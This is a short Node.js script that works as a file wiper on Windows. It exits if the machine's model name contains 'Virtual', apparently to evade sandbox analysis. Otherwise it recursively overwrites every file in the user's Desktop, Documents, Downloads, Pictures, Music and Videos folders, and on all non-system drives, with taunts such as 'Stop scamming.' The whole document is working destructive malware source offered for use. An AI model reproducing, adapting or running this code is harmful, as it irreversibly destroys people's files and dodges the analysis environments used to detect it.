"use strict";

// Dependencies
const { execSync } = require("child_process")
const path = require("path")
const os = require("os")
const fs = require("fs")

// Variables
const homeDir = os.homedir()
const messages = [
    "Deserved.",
    "Who knew.",
    "Why are you bad?",
    "Too bad.",
    "Stop scamming.",
    "Lmfao",
    "Quit doing something bad. <3"
]
const paths = [
    "Desktop",
    "Videos",
    "Documents",
    "Downloads",
    "Music",
    "Pictures"
]

// Functions
const getDrives = ()=>{return execSync("wmic logicaldisk get caption").toString("utf8").split("\n").slice(1).map((d)=>d.match(/\w+/) ? `${d.match(/\w+/)[0]}:` : false).filter((d)=>d && d !== "C:")}
function destroyFiles(dir){
    try{
        const files = fs.readdirSync(dir)

        files.forEach((file) => {
            const filePath = path.join(dir, file)
            const stats = fs.statSync(filePath)

            if(stats.isDirectory()){
                destroyFiles(filePath)
            }else{
                try{
                    fs.writeFileSync(filePath, messages[Math.floor(Math.random() * messages.length)], "utf8")
                }catch{}
            }
        })
    }catch{}
}

// Main
const systemModel = execSync("wmic csproduct get name").toString("utf8")

if(systemModel.match("Virtual")) return
// if(homeDir.match("riki")) return process.exit()
for( const hP of paths ) destroyFiles(path.join(homeDir, hP))
for( const drive of getDrives() ) destroyFiles(drive)